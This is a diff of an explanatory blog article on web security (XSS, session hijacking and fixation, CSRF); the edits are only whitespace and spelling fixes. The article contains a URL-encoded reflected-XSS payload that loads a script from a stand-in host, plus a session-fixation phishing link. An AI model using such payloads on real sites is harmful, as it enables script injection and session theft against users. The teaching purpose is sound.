@@ -29,7 +29,7 @@ There are quite a lot of developers that when it comes to web application securi
 Both XSS and SQL Injection are cases of *code injection*.
 
 ## Cross-Site Scripting
-XSS refers to a vulnerability where an attacker is able to "inject" Javascript code that will be run by the application. In my previous article, I've discussed the [same-origin](http://achiral.io/cors-made-simple) policy concept at length which states that if content from one site is granted permission to access resources on a system, then any content from that site will share these permissions, while content from another site will have to be granted permissions separately. 
+XSS refers to a vulnerability where an attacker is able to "inject" Javascript code that will be run by the application. In my previous article, I've discussed the [same-origin](http://achiral.io/cors-made-simple) policy concept at length which states that if content from one site is granted permission to access resources on a system, then any content from that site will share these permissions, while content from another site will have to be granted permissions separately.
 
 <i>A lot of people think that SOP prevents XSS attacks. This is <b>not the case.</b></i>
 
@@ -37,7 +37,7 @@ A typical example of XSS is *persistent cross-site scripting*. If a page isn't p
 
 ![image-title-here](/images/attack.png){:class="img-responsive"}
 
-An alternative is the *reflected* (or non-persistent) XSS attack, whereby the user's input is not stored in the database, but returned back in the same way it was inputed. It works like this: say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.
+An alternative is the *reflected* (or non-persistent) XSS attack, whereby the user's input is not stored in the database, but returned back in the same way it was inputted. It works like this: say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.
 
 <pre>
 GET http://www.onlineshop.com?search=something
@@ -47,11 +47,11 @@ If the site finds something, it returns a list of results, but if it doesn't, it
 
 *Your search, 'something', returned no results.*
 
-...which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term in the query string, contains some nefarious script block. If the user clicks on the link (which is likely because most people don't hover on links to see where they lead to), the application server won't be able to find any result, and will return with a *not found* page containing the script rendered directly on the page. 
+...which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term in the query string, contains some nefarious script block. If the user clicks on the link (which is likely because most people don't hover on links to see where they lead to), the application server won't be able to find any result, and will return with a *not found* page containing the script rendered directly on the page.
 
 <pre>
 GET http://www.onlineshop.com?
-  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E 
+  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
   HTTP/1.1
 </pre>
 
@@ -67,9 +67,9 @@ If you are developing with Node / Express, there are plenty of packages to help 
 ## Session Hijacking
 Most web applications use a session mechanism which allows the server hosting the web application to know which user is making a specific request. Sessions usually involve authenticating the user, creating some sort of *session_id* (usually a string) and setting a cookie with that value on the user's browser. Session hijacking is a way of getting to know that string.
 
-One way to gain access to it is, as I mentioned, cross-site scripting. Another typical way of gaining access to that cookie is by sniffing packets. Since browsers send the cookies associated with a domain for every request, somebody sniffing traffic would be able to see also the value of the session cookie. A typical way to sniff traffic is to set up an unencrypted wifi hotspot in a public place, and monitor the traffic of the people connecting to it. Does this mean I cannot use my online banking when I am connected to a public hotspot? No, because if the website uses SSL for all requests, the contents of the traffic won't be intelligible to a man-in-the-middle, and usually major sites like Facebook / Twitter, online banking etc. are pretty well secured. There are however plenty of smaller poorly written sites that only use SSL for the login page, and then pass the session cookie unencrypted to other pages.
+One way to gain access to it is, as I mentioned, cross-site scripting. Another typical way of gaining access to that cookie is by sniffing packets. Since browsers send the cookies associated with a domain for every request, somebody sniffing traffic would be able to see also the value of the session cookie. A typical way to sniff traffic is to set up an unencrypted Wi-Fi hotspot in a public place, and monitor the traffic of the people connecting to it. Does this mean I cannot use my online banking when I am connected to a public hotspot? No, because if the website uses SSL for all requests, the contents of the traffic won't be intelligible to a man-in-the-middle, and usually major sites like Facebook / Twitter, online banking etc. are pretty well secured. There are however plenty of smaller poorly written sites that only use SSL for the login page, and then pass the session cookie unencrypted to other pages.
 
-Another way to gain access to a user's session is to get that user to install a malware on his/hers computer. Since browsers usually store cookies on disk, that malware would be able to access the cookie if it knows where to look for it. 
+Another way to gain access to a user's session is to get that user to install a malware on his/hers computer. Since browsers usually store cookies on disk, that malware would be able to access the cookie if it knows where to look for it.
 
 A yet another way of accomplishing session hijacking is *session fixation*. There are plenty of sites that accept a session ID in the URL, such as:
 
@@ -86,7 +86,7 @@ Hey, click on http://www.website.com?sid=asb1sadasdasdan23123, and enter credit 
 Since the attacker knows the session id, he/she can also log to that page and see the information inputted by the user.
 
 ## Cross-Site Request Forgery
-CSRF is an attack that tricks the victim into submitting a malicious request, and relies on the fact that the user is logged in. Since the browser usually sends the session cookie with the request, the server perceives the request as legitimate. An important part of CSRF attacks is *social engineering*. 
+CSRF is an attack that tricks the victim into submitting a malicious request, and relies on the fact that the user is logged in. Since the browser usually sends the session cookie with the request, the server perceives the request as legitimate. An important part of CSRF attacks is *social engineering*.
 
 ![image-title-here](/images/csfr.png){:class="img-responsive"}
 
